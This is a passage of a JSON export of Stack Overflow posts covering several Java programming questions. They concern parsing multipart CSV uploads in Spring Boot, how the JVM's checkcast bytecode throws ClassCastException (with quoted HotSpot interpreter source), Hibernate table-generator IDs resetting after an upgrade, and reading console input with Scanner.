Pattern.compile(&quot;(?&lt;=name\\\\=\\&quot;\\&quot;text\\&quot;\\&quot;\\r\\n\\r\\n)(.*?)(?=\\r\\n)&quot;);\r\n                Matcher cgtextMatch = re.matcher(content);\r\n\r\n                if (contentTypeMatch.matches() &amp;&amp; filenameMatch.matches()){\r\n                        this.variableType = variableMatch.group();\r\n                        this.ignoreFirstLine = true;\r\n                        this.name = cgnameMatch.group();\r\n                        this.taxelid = taxelidMatch.group();\r\n                        this.text = cgtextMatch.group();\r\n                        this.success = true;\r\n                }\r\n            }\r\n        } catch (Exception e) {\r\n            //logger.error(&quot;Error whilr reading Multipart file:&quot;+e.getMessage());\r\n            e.printStackTrace();\r\n        }\r\n    }\r\n\r\n    public String getName() {\r\n        return name;\r\n    }\r\n\r\n    public void setName(String name) {\r\n        this.name = name;\r\n    }\r\n\r\n    public String getVariableType() {\r\n        return variableType;\r\n    }\r\n\r\n    public void setVariableType(String variableType) {\r\n        this.variableType = variableType;\r\n    }\r\n\r\n    public String getTaxelid() {\r\n        return taxelid;\r\n    }\r\n\r\n    public void setTaxelid(String taxelid) {\r\n        this.taxelid = taxelid;\r\n    }\r\n\r\n    public String getText() {\r\n        return text;\r\n    }\r\n\r\n    public void setText(String text) {\r\n        this.text = text;\r\n    }\r\n\r\n    public String getContentType() {\r\n        return contentType;\r\n    }\r\n\r\n    public void setContentType(String contentType) {\r\n        this.contentType = contentType;\r\n    }\r\n\r\n    public String getFileName() {\r\n        return fileName;\r\n    }\r\n\r\n    public void setFileName(String fileName) {\r\n        this.fileName = fileName;\r\n    }\r\n\r\n    public boolean isIgnoreFirstLine() {\r\n        return ignoreFirstLine;\r\n    }\r\n\r\n    public void setIgnoreFirstLine(boolean ignoreFirstLine) {\r\n        this.ignoreFirstLine = ignoreFirstLine;\r\n    }\r\n\r\n    public boolean isSuccess() {\r\n        return success;\r\n    }\r\n\r\n    public void setSuccess(boolean success) {\r\n        this.success = success;\r\n    }\r\n}\r\n```\r\nCan anyone please tell me how can I get other attributes apart from file content in Postman or what settings I need to do it Postman to get other attributes need to pass the regular expression.\r\n\r\nRegatds,\r\nPrabhash","title":"Reading and Validate CSV file in springboot","body":"<p>I am reading and validating data stored in .csv file in springboot.I am able to get the content of .csv file. Also I want to validate the data stored in file for that I need some extra attribute apart from file content. If I am uploading file from web page I can see the extra attributes needed . But If I uploading file from postman only file content is coming not the other required attribute. Its migration work where I am migrating code from .net to java. If I am uploading file through .NET web from I am getting below content which includes .csv file contents and other attribute but while developing same in Java through postman i can see the content of .csv file which is highlighted under RED line.\n<a href=\"https://i.stack.imgur.com/Cy7dk.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/Cy7dk.png\" alt=\"enter image description here\" /></a></p>\n<p>For validating .csv data I am using below java code including regular expression.</p>\n<pre><code>public class MultipartParser {\n   // private static final Logger logger = LogManager.getLogger(MultipartParser.class);\n\n    public boolean success = false;\n    public String name;\n    public  String variableType;\n    public String taxelid;\n    public String text;\n    public String contentType;\n    public String fileName;\n\n    public boolean ignoreFirstLine;\n\n    public MultipartParser(){}\n    public MultipartParser(MultipartFile stream){\n        this.parse(stream);\n    }\n    public void parse(MultipartFile stream) {\n        ///logger.info(&quot;Inside parser&quot;);\n\n        try {\n            String content = new String(stream.getBytes(), StandardCharsets.UTF_8);\n            System.out.println(&quot;CONTENT::&quot;+content);\n            int delimiterEndIndex = content.indexOf(&quot;\\r\\n&quot;);\n\n            if (delimiterEndIndex &gt; -1)\n            {\n                String delimiter = content.substring(0, content.indexOf(&quot;\\r\\n&quot;));\n                // Look for Content-Type\n                Pattern re = Pattern.compile(&quot;(?&lt;=Content\\\\-Type:)(.*?)(?=\\r\\n\\r\\n)&quot;);\n                Matcher contentTypeMatch = re.matcher(content);\n\n                // Look for filename\n                re = Pattern.compile(&quot;(?&lt;=filename\\\\=\\&quot;\\&quot;)(.*?)(?=\\&quot;\\&quot;)&quot;);\n                Matcher filenameMatch = re.matcher(content);\n\n                // Look for variable\n                re = Pattern.compile(&quot;(?&lt;=name\\\\=\\&quot;\\&quot;variable\\&quot;\\&quot;\\r\\n\\r\\n)(.*?)(?=\\r\\n)&quot;);\n                Matcher variableMatch = re.matcher(content);\n\n                re = Pattern.compile(&quot;(?&lt;=name\\\\=\\&quot;\\&quot;taxelid\\&quot;\\&quot;\\r\\n\\r\\n)(.*?)(?=\\r\\n)&quot;);\n                Matcher taxelidMatch = re.matcher(content);\n\n                // Look for name\n                re = Pattern.compile(&quot;(?&lt;=name\\\\=\\&quot;\\&quot;cgname\\&quot;\\&quot;\\r\\n\\r\\n)(.*?)(?=\\r\\n)&quot;);\n                Matcher cgnameMatch = re.matcher(content);\n\n                re = Pattern.compile(&quot;(?&lt;=name\\\\=\\&quot;\\&quot;text\\&quot;\\&quot;\\r\\n\\r\\n)(.*?)(?=\\r\\n)&quot;);\n                Matcher cgtextMatch = re.matcher(content);\n\n                if (contentTypeMatch.matches() &amp;&amp; filenameMatch.matches()){\n                        this.variableType = variableMatch.group();\n                        this.ignoreFirstLine = true;\n                        this.name = cgnameMatch.group();\n                        this.taxelid = taxelidMatch.group();\n                        this.text = cgtextMatch.group();\n                        this.success = true;\n                }\n            }\n        } catch (Exception e) {\n            //logger.error(&quot;Error whilr reading Multipart file:&quot;+e.getMessage());\n            e.printStackTrace();\n        }\n    }\n\n    public String getName() {\n        return name;\n    }\n\n    public void setName(String name) {\n        this.name = name;\n    }\n\n    public String getVariableType() {\n        return variableType;\n    }\n\n    public void setVariableType(String variableType) {\n        this.variableType = variableType;\n    }\n\n    public String getTaxelid() {\n        return taxelid;\n    }\n\n    public void setTaxelid(String taxelid) {\n        this.taxelid = taxelid;\n    }\n\n    public String getText() {\n        return text;\n    }\n\n    public void setText(String text) {\n        this.text = text;\n    }\n\n    public String getContentType() {\n        return contentType;\n    }\n\n    public void setContentType(String contentType) {\n        this.contentType = contentType;\n    }\n\n    public String getFileName() {\n        return fileName;\n    }\n\n    public void setFileName(String fileName) {\n        this.fileName = fileName;\n    }\n\n    public boolean isIgnoreFirstLine() {\n        return ignoreFirstLine;\n    }\n\n    public void setIgnoreFirstLine(boolean ignoreFirstLine) {\n        this.ignoreFirstLine = ignoreFirstLine;\n    }\n\n    public boolean isSuccess() {\n        return success;\n    }\n\n    public void setSuccess(boolean success) {\n        this.success = success;\n    }\n}\n</code></pre>\n<p>Can anyone please tell me how can I get other attributes apart from file content in Postman or what settings I need to do it Postman to get other attributes need to pass the regular expression.</p>\n<p>Regatds,\nPrabhash</p>\n"},{"tags":["java","casting","jvm","runtime"],"comments":[{"owner":{"account_id":1394089,"reputation":40460,"user_id":1424875,"accept_rate":86,"display_name":"nanofarad"},"score":3,"creation_date":1466010496,"post_id":37841004,"comment_id":63144071,"body_markdown":"As for your edit, it would be better to just use the type system and OOP principles instead of odd Java internals. Just have a `Pipe` class (extending Object) that has a `getInputStream` and a `getOutputStream` method, each of which returns an instance of a corresponding inner class (i.e. `Pipe$PipeInputStream` and `Pipe$PipeOutputStream`, both of which access the private/protected state of `Pipe`)","body":"As for your edit, it would be better to just use the type system and OOP principles instead of odd Java internals. Just have a <code>Pipe</code> class (extending Object) that has a <code>getInputStream</code> and a <code>getOutputStream</code> method, each of which returns an instance of a corresponding inner class (i.e. <code>Pipe$PipeInputStream</code> and <code>Pipe$PipeOutputStream</code>, both of which access the private/protected state of <code>Pipe</code>)"},{"owner":{"account_id":1107482,"reputation":2870,"user_id":1098603,"accept_rate":94,"display_name":"Matthieu"},"score":1,"creation_date":1466010647,"post_id":37841004,"comment_id":63144167,"body_markdown":"@hexafraction that&#39;s how it should be handled, and how I would have implemented it anyway. But I like to try different routes and test different ways of achieving the same things, even the ugliest hacks (I love obfuscation contests ;))","body":"@hexafraction that&#39;s how it should be handled, and how I would have implemented it anyway. But I like to try different routes and test different ways of achieving the same things, even the ugliest hacks (I love obfuscation contests ;))"},{"owner":{"account_id":1394089,"reputation":40460,"user_id":1424875,"accept_rate":86,"display_name":"nanofarad"},"score":1,"creation_date":1466010720,"post_id":37841004,"comment_id":63144200,"body_markdown":"If you have a working build system that can build OpenJDK and an understanding of C++, it&#39;s all there and available for you. Just add some code that invokes an `onCast` method if it exists :)","body":"If you have a working build system that can build OpenJDK and an understanding of C++, it&#39;s all there and available for you. Just add some code that invokes an <code>onCast</code> method if it exists :)"},{"owner":{"account_id":1107482,"reputation":2870,"user_id":1098603,"accept_rate":94,"display_name":"Matthieu"},"score":1,"creation_date":1466010853,"post_id":37841004,"comment_id":63144278,"body_markdown":"@hexafraction oh man... You just ruined the little spare time I had left! ;) I&#39;ll start by implementing `ubyte` though (sigh)... :)","body":"@hexafraction oh man... You just ruined the little spare time I had left! ;) I&#39;ll start by implementing <code>ubyte</code> though (sigh)... :)"},{"owner":{"account_id":1394089,"reputation":40460,"user_id":1424875,"accept_rate":86,"display_name":"nanofarad"},"score":2,"creation_date":1466011047,"post_id":37841004,"comment_id":63144383,"body_markdown":"`ubyte` may have more difficulty and work involved since you need to do a lot of work both at the compiler and at the JVM. However, if you do implement it, I&#39;d appreciate seeing a copy of the patch/changeset.","body":"<code>ubyte</code> may have more difficulty and work involved since you need to do a lot of work both at the compiler and at the JVM. However, if you do implement it, I&#39;d appreciate seeing a copy of the patch/changeset."}],"answers":[{"tags":[],"owner":{"account_id":1394089,"reputation":40460,"user_id":1424875,"accept_rate":86,"display_name":"nanofarad"},"down_vote_count":0,"up_vote_count":17,"is_accepted":true,"score":17,"last_activity_date":1466025507,"creation_date":1466008574,"answer_id":37841078,"question_id":37841004,"body_markdown":"The JVM has a bytecode, `checkcast`, which is used to check if a cast can be validly performed. The actual cast check semantics are described in the [JLS&#167;5.5.3](https://docs.oracle.com/javase/specs/jls/se8/html/jls-5.html#jls-5.5.3), and the details of the `checkcast` bytecode are described in the [JVM spec&#167;6.5](https://docs.oracle.com/javase/specs/jvms/se8/html/jvms-6.html#jvms-6.5.checkcast). As an example, \r\n\r\n    public static void main(String args[]) {\r\n       Number n = Integer.valueOf(66); // Autoboxing\r\n    \r\n       incr((Integer) n);\r\n    \r\n       System.out.println(n);\r\n    }\r\n       \r\n\r\nproduces\r\n\r\n     public static void main(java.lang.String[]);\r\n        Code:\r\n           0: bipush        66\r\n           2: invokestatic  #3                  // Method java/lang/Integer.valueOf:(I)Ljava/lang/Integer;\r\n           5: astore_1\r\n           6: aload_1\r\n           7: checkcast     #4                  // class java/lang/Integer\r\n          10: invokestatic  #5                  // Method incr:(Ljava/lang/Integer;)V\r\n          13: getstatic     #6                  // Field java/lang/System.out:Ljava/io/PrintStream;\r\n          16: aload_1\r\n          17: invokevirtual #7                  // Method java/io/PrintStream.println:(Ljava/lang/Object;)V\r\n          20: return\r\n\r\nAdditionally, by delving into Hotspot&#39;s source code we can see two implementations of `checkcast`, one used in production and another used for simple test and early ports.\r\n\r\nFirst shown is the production template-based interpreter (thanks to [apangin](https://stackoverflow.com/users/3448419/apangin) for making me aware of it) which generates code that corresponds to a null check of the reference to be cast-checked, the loading of the class information, a call to a subtype check, and a possible jump to code that throws a ClassCastException:\r\n\r\n&lt;!-- language: lang-cpp --&gt;\r\n\r\n    void TemplateTable::checkcast() {\r\n      transition(atos, atos);\r\n      Label done, is_null, ok_is_subtype, quicked, resolved;\r\n      __ testptr(rax, rax); // object is in rax\r\n      __ jcc(Assembler::zero, is_null);\r\n    \r\n      // Get cpool &amp; tags index\r\n      __ get_cpool_and_tags(rcx, rdx); // rcx=cpool, rdx=tags array\r\n      __ get_unsigned_2_byte_index_at_bcp(rbx, 1); // rbx=index\r\n      // See if bytecode has already been quicked\r\n      __ cmpb(Address(rdx, rbx,\r\n                      Address::times_1,\r\n                      Array&lt;u1&gt;::base_offset_in_bytes()),\r\n              JVM_CONSTANT_Class);\r\n      __ jcc(Assembler::equal, quicked);\r\n      __ push(atos); // save receiver for result, and for GC\r\n      call_VM(noreg, CAST_FROM_FN_PTR(address, InterpreterRuntime::quicken_io_cc));\r\n      // vm_result_2 has metadata result\r\n      __ get_vm_result_2(rax, r15_thread);\r\n      __ pop_ptr(rdx); // restore receiver\r\n      __ jmpb(resolved);\r\n    \r\n      // Get superklass in rax and subklass in rbx\r\n      __ bind(quicked);\r\n      __ mov(rdx, rax); // Save object in rdx; rax needed for subtype check\r\n      __ movptr(rax, Address(rcx, rbx,\r\n                           Address::times_8, sizeof(ConstantPool)));\r\n    \r\n      __ bind(resolved);\r\n      __ load_klass(rbx, rdx);\r\n    \r\n      // Generate subtype check.  Blows rcx, rdi.  Object in rdx.\r\n      // Superklass in rax.  Subklass in rbx.\r\n      __ gen_subtype_check(rbx, ok_is_subtype);\r\n    \r\n      // Come here on failure\r\n      __ push_ptr(rdx);\r\n      // object is at TOS\r\n      __ jump(ExternalAddress(Interpreter::_throw_ClassCastException_entry));\r\n    \r\n      // Come here on success\r\n      __ bind(ok_is_subtype);\r\n      __ mov(rax, rdx); // Restore object in rdx\r\n    \r\n      // Collect counts on whether this check-cast sees NULLs a lot or not.\r\n      if (ProfileInterpreter) {\r\n        __ jmp(done);\r\n        __ bind(is_null);\r\n        __ profile_null_seen(rcx);\r\n      } else {\r\n        __ bind(is_null);   // same as &#39;done&#39;\r\n      }\r\n      __ bind(done);\r\n    }\r\n\r\n\r\nThe simple non-production interpreter can show us another example at [`bytecodeInterpreter.cpp` line 2048](http://hg.openjdk.java.net/jdk8/jdk8/hotspot/file/87ee5ee27509/src/share/vm/interpreter/bytecodeInterpreter.cpp#l2048). We can actually see what happens in a *sample* compliant bytecode interpreter when a `checkcast` is reached:\r\n\r\n&lt;!-- language: lang-cpp --&gt;\r\n\r\n      CASE(_checkcast):\r\n          if (STACK_OBJECT(-1) != NULL) {\r\n            VERIFY_OOP(STACK_OBJECT(-1));\r\n            u2 index = Bytes::get_Java_u2(pc+1);\r\n            if (ProfileInterpreter) {\r\n              // needs Profile_checkcast QQQ\r\n              ShouldNotReachHere();\r\n            }\r\n            // Constant pool may have actual klass or unresolved klass. If it is\r\n            // unresolved we must resolve it\r\n            if (METHOD-&gt;constants()-&gt;tag_at(index).is_unresolved_klass()) {\r\n              CALL_VM(InterpreterRuntime::quicken_io_cc(THREAD), handle_exception);\r\n            }\r\n            Klass* klassOf = (Klass*) METHOD-&gt;constants()-&gt;slot_at(index).get_klass();\r\n            Klass* objKlassOop = STACK_OBJECT(-1)-&gt;klass(); //ebx\r\n            //\r\n            // Check for compatibilty. This check must not GC!!\r\n            // Seems way more expensive now that we must dispatch\r\n            //\r\n            if (objKlassOop != klassOf &amp;&amp;\r\n                !objKlassOop-&gt;is_subtype_of(klassOf)) {\r\n              ResourceMark rm(THREAD);\r\n              const char* objName = objKlassOop-&gt;external_name();\r\n              const char* klassName = klassOf-&gt;external_name();\r\n              char* message = SharedRuntime::generate_class_cast_message(\r\n                objName, klassName);\r\n              VM_JAVA_ERROR(vmSymbols::java_lang_ClassCastException(), message);\r\n            }\r\n          } else {\r\n            if (UncommonNullCast) {\r\n                //              istate-&gt;method()-&gt;set_null_cast_seen();\r\n                // [RGV] Not sure what to do here!\r\n\r\n            }\r\n          }\r\n          UPDATE_PC_AND_CONTINUE(3);\r\n\r\nIn a nutshell, it grabs the argument off the stack, gets the Class object from the constant pool (resolving if necessary), and checks if the argument is assignable to that class. If not, it gets the names of the object&#39;s type and of the class to which the cast was attempted, constructs an exception message, and throws a ClassCastException with that message. Oddly enough, the mechanism for throwing a ClassCastException is not the same as that used for the `athrow` bytecode (using `VM_JAVA_ERROR` instead of `set_pending_exception`).\r\n\r\n\r\n**Response to edit:** it would be better to just use the type system and OOP principles instead of odd Java internals. Just have a `Pipe` class (extending Object) that has a `getInputStream` and a `getOutputStream` method, each of which returns an instance of a corresponding inner class (i.e. `Pipe$PipeInputStream` and `Pipe$PipeOutputStream`, both of which access the private/protected state of `Pipe`)","title":"How does the JVM actually cast objects and issue a ClassCastException?","body":"<p>The JVM has a bytecode, <code>checkcast</code>, which is used to check if a cast can be validly performed. The actual cast check semantics are described in the <a href=\"https://docs.oracle.com/javase/specs/jls/se8/html/jls-5.html#jls-5.5.3\" rel=\"noreferrer\">JLS§5.5.3</a>, and the details of the <code>checkcast</code> bytecode are described in the <a href=\"https://docs.oracle.com/javase/specs/jvms/se8/html/jvms-6.html#jvms-6.5.checkcast\" rel=\"noreferrer\">JVM spec§6.5</a>. As an example, </p>\n\n<pre><code>public static void main(String args[]) {\n   Number n = Integer.valueOf(66); // Autoboxing\n\n   incr((Integer) n);\n\n   System.out.println(n);\n}\n</code></pre>\n\n<p>produces</p>\n\n<pre><code> public static void main(java.lang.String[]);\n    Code:\n       0: bipush        66\n       2: invokestatic  #3                  // Method java/lang/Integer.valueOf:(I)Ljava/lang/Integer;\n       5: astore_1\n       6: aload_1\n       7: checkcast     #4                  // class java/lang/Integer\n      10: invokestatic  #5                  // Method incr:(Ljava/lang/Integer;)V\n      13: getstatic     #6                  // Field java/lang/System.out:Ljava/io/PrintStream;\n      16: aload_1\n      17: invokevirtual #7                  // Method java/io/PrintStream.println:(Ljava/lang/Object;)V\n      20: return\n</code></pre>\n\n<p>Additionally, by delving into Hotspot's source code we can see two implementations of <code>checkcast</code>, one used in production and another used for simple test and early ports.</p>\n\n<p>First shown is the production template-based interpreter (thanks to <a href=\"https://stackoverflow.com/users/3448419/apangin\">apangin</a> for making me aware of it) which generates code that corresponds to a null check of the reference to be cast-checked, the loading of the class information, a call to a subtype check, and a possible jump to code that throws a ClassCastException:</p>\n\n<pre class=\"lang-cpp prettyprint-override\"><code>void TemplateTable::checkcast() {\n  transition(atos, atos);\n  Label done, is_null, ok_is_subtype, quicked, resolved;\n  __ testptr(rax, rax); // object is in rax\n  __ jcc(Assembler::zero, is_null);\n\n  // Get cpool &amp; tags index\n  __ get_cpool_and_tags(rcx, rdx); // rcx=cpool, rdx=tags array\n  __ get_unsigned_2_byte_index_at_bcp(rbx, 1); // rbx=index\n  // See if bytecode has already been quicked\n  __ cmpb(Address(rdx, rbx,\n                  Address::times_1,\n                  Array&lt;u1&gt;::base_offset_in_bytes()),\n          JVM_CONSTANT_Class);\n  __ jcc(Assembler::equal, quicked);\n  __ push(atos); // save receiver for result, and for GC\n  call_VM(noreg, CAST_FROM_FN_PTR(address, InterpreterRuntime::quicken_io_cc));\n  // vm_result_2 has metadata result\n  __ get_vm_result_2(rax, r15_thread);\n  __ pop_ptr(rdx); // restore receiver\n  __ jmpb(resolved);\n\n  // Get superklass in rax and subklass in rbx\n  __ bind(quicked);\n  __ mov(rdx, rax); // Save object in rdx; rax needed for subtype check\n  __ movptr(rax, Address(rcx, rbx,\n                       Address::times_8, sizeof(ConstantPool)));\n\n  __ bind(resolved);\n  __ load_klass(rbx, rdx);\n\n  // Generate subtype check.  Blows rcx, rdi.  Object in rdx.\n  // Superklass in rax.  Subklass in rbx.\n  __ gen_subtype_check(rbx, ok_is_subtype);\n\n  // Come here on failure\n  __ push_ptr(rdx);\n  // object is at TOS\n  __ jump(ExternalAddress(Interpreter::_throw_ClassCastException_entry));\n\n  // Come here on success\n  __ bind(ok_is_subtype);\n  __ mov(rax, rdx); // Restore object in rdx\n\n  // Collect counts on whether this check-cast sees NULLs a lot or not.\n  if (ProfileInterpreter) {\n    __ jmp(done);\n    __ bind(is_null);\n    __ profile_null_seen(rcx);\n  } else {\n    __ bind(is_null);   // same as 'done'\n  }\n  __ bind(done);\n}\n</code></pre>\n\n<p>The simple non-production interpreter can show us another example at <a href=\"http://hg.openjdk.java.net/jdk8/jdk8/hotspot/file/87ee5ee27509/src/share/vm/interpreter/bytecodeInterpreter.cpp#l2048\" rel=\"noreferrer\"><code>bytecodeInterpreter.cpp</code> line 2048</a>. We can actually see what happens in a <em>sample</em> compliant bytecode interpreter when a <code>checkcast</code> is reached:</p>\n\n<pre class=\"lang-cpp prettyprint-override\"><code>  CASE(_checkcast):\n      if (STACK_OBJECT(-1) != NULL) {\n        VERIFY_OOP(STACK_OBJECT(-1));\n        u2 index = Bytes::get_Java_u2(pc+1);\n        if (ProfileInterpreter) {\n          // needs Profile_checkcast QQQ\n          ShouldNotReachHere();\n        }\n        // Constant pool may have actual klass or unresolved klass. If it is\n        // unresolved we must resolve it\n        if (METHOD-&gt;constants()-&gt;tag_at(index).is_unresolved_klass()) {\n          CALL_VM(InterpreterRuntime::quicken_io_cc(THREAD), handle_exception);\n        }\n        Klass* klassOf = (Klass*) METHOD-&gt;constants()-&gt;slot_at(index).get_klass();\n        Klass* objKlassOop = STACK_OBJECT(-1)-&gt;klass(); //ebx\n        //\n        // Check for compatibilty. This check must not GC!!\n        // Seems way more expensive now that we must dispatch\n        //\n        if (objKlassOop != klassOf &amp;&amp;\n            !objKlassOop-&gt;is_subtype_of(klassOf)) {\n          ResourceMark rm(THREAD);\n          const char* objName = objKlassOop-&gt;external_name();\n          const char* klassName = klassOf-&gt;external_name();\n          char* message = SharedRuntime::generate_class_cast_message(\n            objName, klassName);\n          VM_JAVA_ERROR(vmSymbols::java_lang_ClassCastException(), message);\n        }\n      } else {\n        if (UncommonNullCast) {\n            //              istate-&gt;method()-&gt;set_null_cast_seen();\n            // [RGV] Not sure what to do here!\n\n        }\n      }\n      UPDATE_PC_AND_CONTINUE(3);\n</code></pre>\n\n<p>In a nutshell, it grabs the argument off the stack, gets the Class object from the constant pool (resolving if necessary), and checks if the argument is assignable to that class. If not, it gets the names of the object's type and of the class to which the cast was attempted, constructs an exception message, and throws a ClassCastException with that message. Oddly enough, the mechanism for throwing a ClassCastException is not the same as that used for the <code>athrow</code> bytecode (using <code>VM_JAVA_ERROR</code> instead of <code>set_pending_exception</code>).</p>\n\n<p><strong>Response to edit:</strong> it would be better to just use the type system and OOP principles instead of odd Java internals. Just have a <code>Pipe</code> class (extending Object) that has a <code>getInputStream</code> and a <code>getOutputStream</code> method, each of which returns an instance of a corresponding inner class (i.e. <code>Pipe$PipeInputStream</code> and <code>Pipe$PipeOutputStream</code>, both of which access the private/protected state of <code>Pipe</code>)</p>\n"},{"tags":[],"owner":{"account_id":5199348,"reputation":637,"user_id":4159348,"display_name":"yash sachdeva"},"down_vote_count":0,"up_vote_count":3,"is_accepted":false,"score":3,"last_activity_date":1466008966,"creation_date":1466008966,"answer_id":37841198,"question_id":37841004,"body_markdown":"This checking occurs twice, during compile time by the compiler and during run time by the jvm. \r\n\r\nDuring compile time, the compiler sees if the elements belong to the same hierarchy,(eg: Vehicle-&gt;Car-&gt;BMW) , and it is only at runtime that the jvm sees that what the object really is.The compiler deals with references and the jvm deals with objects.\r\n\r\n\r\nNow, during classcast exception, the elements that are casted incorrectly are in same hierarchy, so the compilation occurs successfully, BUT the jvm during runtime sees the object and identifies the incorrect cast and the exception is thrown.\r\n\r\n","title":"How does the JVM actually cast objects and issue a ClassCastException?","body":"<p>This checking occurs twice, during compile time by the compiler and during run time by the jvm. </p>\n\n<p>During compile time, the compiler sees if the elements belong to the same hierarchy,(eg: Vehicle->Car->BMW) , and it is only at runtime that the jvm sees that what the object really is.The compiler deals with references and the jvm deals with objects.</p>\n\n<p>Now, during classcast exception, the elements that are casted incorrectly are in same hierarchy, so the compilation occurs successfully, BUT the jvm during runtime sees the object and identifies the incorrect cast and the exception is thrown.</p>\n"}],"owner":{"account_id":1107482,"reputation":2870,"user_id":1098603,"accept_rate":94,"display_name":"Matthieu"},"comment_count":5,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":2244,"favorite_count":0,"down_vote_count":0,"up_vote_count":8,"accepted_answer_id":37841078,"answer_count":2,"score":8,"last_activity_date":1683709690,"creation_date":1466008365,"question_id":37841004,"body_markdown":"What happens under the hood when you cast an object to a specific class like `casted = (NewClass)obj;`? I&#39;m guessing the JVM somehow checks if the actual class of `obj` is a subclass of `NewClass`, but would there be a way for an object instance to know when it is being &quot;casted&quot;?\r\n\r\nPointers to the documentation/FAQ of some JVM implementations are also welcome, as I haven&#39;t been able to find any...\r\n\r\nEDIT as to &quot;why an object should know when it is being casted?&quot;:\r\n\r\nI was recently thinking about implementing a kind of Pipe that would be both an `InputStream` and an `OutputStream`. As these are classes and not interfaces, it cannot be both (as Java cannot extend multiple classes), so I was wondering if there might be a way for an object to show a different view of itself, through a somehow-interceptable casting operation, like C++ cast operators.\r\n\r\nNot that I wanted to implement it anyway (well, I would have for testing and funny hack purpose ;)) because it would be way too dangerous and would allow for all kind of crazy abuses and misuses.","title":"How does the JVM actually cast objects and issue a ClassCastException?","body":"<p>What happens under the hood when you cast an object to a specific class like <code>casted = (NewClass)obj;</code>? I'm guessing the JVM somehow checks if the actual class of <code>obj</code> is a subclass of <code>NewClass</code>, but would there be a way for an object instance to know when it is being &quot;casted&quot;?</p>\n<p>Pointers to the documentation/FAQ of some JVM implementations are also welcome, as I haven't been able to find any...</p>\n<p>EDIT as to &quot;why an object should know when it is being casted?&quot;:</p>\n<p>I was recently thinking about implementing a kind of Pipe that would be both an <code>InputStream</code> and an <code>OutputStream</code>. As these are classes and not interfaces, it cannot be both (as Java cannot extend multiple classes), so I was wondering if there might be a way for an object to show a different view of itself, through a somehow-interceptable casting operation, like C++ cast operators.</p>\n<p>Not that I wanted to implement it anyway (well, I would have for testing and funny hack purpose ;)) because it would be way too dangerous and would allow for all kind of crazy abuses and misuses.</p>\n"},{"tags":["java","hibernate","hibernate-criteria"],"owner":{"account_id":10189955,"reputation":451,"user_id":7523723,"display_name":"Tal Levi"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":18,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"answer_count":0,"score":0,"last_activity_date":1683709597,"creation_date":1683709597,"question_id":76216669,"body_markdown":"I have a java project to uses hibernate.\r\nI have my base enrty that all my other entires are extended to:\r\n\r\n    @MappedSuperclass\r\n    public abstract class BaseEntry {\r\n        private Long id;\r\n    \r\n        @Id\r\n        @GeneratedValue(strategy = GenerationType.TABLE, generator = &quot;itpGenerator&quot;)\r\n        @TableGenerator(name = &quot;itpGenerator&quot;,\r\n                // the first 999 entries are saved for items that come with the system\r\n                initialValue = 1000,\r\n                allocationSize = 100\r\n        )\r\n        @Column(name=&quot;ID&quot;, insertable = false, updatable = false)\r\n        public Long getId() {\r\n            return id;\r\n        }\r\n    \r\n        public void setId(Long id) {\r\n            this.id = id;\r\n        }\r\n    }\r\n\r\nexample for such entry that extended to the base:\r\n\r\n    @Entity\r\n    @Table(name = &quot;AD_ENDPOINTS&quot;)\r\n    public class ActiveDirectoryEndpointEntry extends BaseEntry {\r\n        private String name;\r\n    \r\n        @Column(name = &quot;FRIENDLY_NAME&quot;)\r\n        public String getName() {\r\n            return name;\r\n        }\r\n    }\r\n\r\nso let&#39;s say that before the upgrade, I entered 2 entries for ActiveDirectoryEndpointEntry and they were kept in the database with id 1001 and 1002.\r\n\r\nafter I upgraded the hibernate version to 5.4.24.Final and tried to enter a new entry for ActiveDirectoryEndpointEntry, I get an error:\r\n\r\n     ERROR: duplicate key value violates unique constraint &quot;ad_endpoints_pkey&quot;\r\n      Detail: Key (id)=(1001) already exists.\r\n\r\nmeaning the id was reset back to the staring number.\r\nHow can I prevent the id from going back to the starting number and continue the sequence that started before the upgrade?\r\n\r\n","title":"Column @Id is resetting back to the starting number after upgrading hibernate version from 5.0.3.Final to 5.4.24.Final","body":"<p>I have a java project to uses hibernate.\nI have my base enrty that all my other entires are extended to:</p>\n<pre><code>@MappedSuperclass\npublic abstract class BaseEntry {\n    private Long id;\n\n    @Id\n    @GeneratedValue(strategy = GenerationType.TABLE, generator = &quot;itpGenerator&quot;)\n    @TableGenerator(name = &quot;itpGenerator&quot;,\n            // the first 999 entries are saved for items that come with the system\n            initialValue = 1000,\n            allocationSize = 100\n    )\n    @Column(name=&quot;ID&quot;, insertable = false, updatable = false)\n    public Long getId() {\n        return id;\n    }\n\n    public void setId(Long id) {\n        this.id = id;\n    }\n}\n</code></pre>\n<p>example for such entry that extended to the base:</p>\n<pre><code>@Entity\n@Table(name = &quot;AD_ENDPOINTS&quot;)\npublic class ActiveDirectoryEndpointEntry extends BaseEntry {\n    private String name;\n\n    @Column(name = &quot;FRIENDLY_NAME&quot;)\n    public String getName() {\n        return name;\n    }\n}\n</code></pre>\n<p>so let's say that before the upgrade, I entered 2 entries for ActiveDirectoryEndpointEntry and they were kept in the database with id 1001 and 1002.</p>\n<p>after I upgraded the hibernate version to 5.4.24.Final and tried to enter a new entry for ActiveDirectoryEndpointEntry, I get an error:</p>\n<pre><code> ERROR: duplicate key value violates unique constraint &quot;ad_endpoints_pkey&quot;\n  Detail: Key (id)=(1001) already exists.\n</code></pre>\n<p>meaning the id was reset back to the staring number.\nHow can I prevent the id from going back to the starting number and continue the sequence that started before the upgrade?</p>\n"},{"tags":["java","arraylist","java.util.scanner"],"answers":[{"tags":[],"owner":{"account_id":25591,"reputation":61024,"user_id":65868,"accept_rate":68,"display_name":"TofuBeer"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1317578725,"creation_date":1317578725,"answer_id":7628217,"question_id":7628183,"body_markdown":"You could call input.hasNextLine and input.nextLine to get a line, and then create a new Scanner for the line you got and use the code that you have now.  Not the cheapest solution, but an easy way to implement it until you come up with a better one :-)","title":"Java Scanner, taking user input from console into array list as separate words","body":"<p>You could call input.hasNextLine and input.nextLine to get a line, and then create a new Scanner for the line you got and use the code that you have now.  Not the cheapest solution, but an easy way to implement it until you come up with a better one :-)</p>\n"},{"tags":[],"owner":{"account_id":23121,"reputation":527346,"user_id":57695,"accept_rate":75,"display_name":"Peter 